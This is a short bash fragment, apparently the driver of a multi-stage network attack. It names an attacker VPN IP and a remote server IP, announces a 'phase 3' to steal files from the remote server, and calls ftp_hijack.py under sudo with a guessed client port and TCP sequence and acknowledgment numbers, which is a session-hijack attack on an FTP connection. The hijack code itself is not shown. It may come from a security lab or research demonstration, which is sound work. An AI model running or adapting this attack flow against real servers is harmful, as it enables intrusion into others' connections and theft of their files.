# !/bin/bash
ATTACKER_PRIVATE_IP=10.5.0.2; # VPN private IP of the local attacker after connecting with the VPN server
REMOTE_SERVER_IP=43.159.39.110; # public ip of remote-server to check for connection
...
printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 3~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 3 to steal files from the remote server."


cd ../3-hijack_session
sudo python3 ftp_hijack.py ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${SEQ} ${ACK} ${PACKET_IFACE}
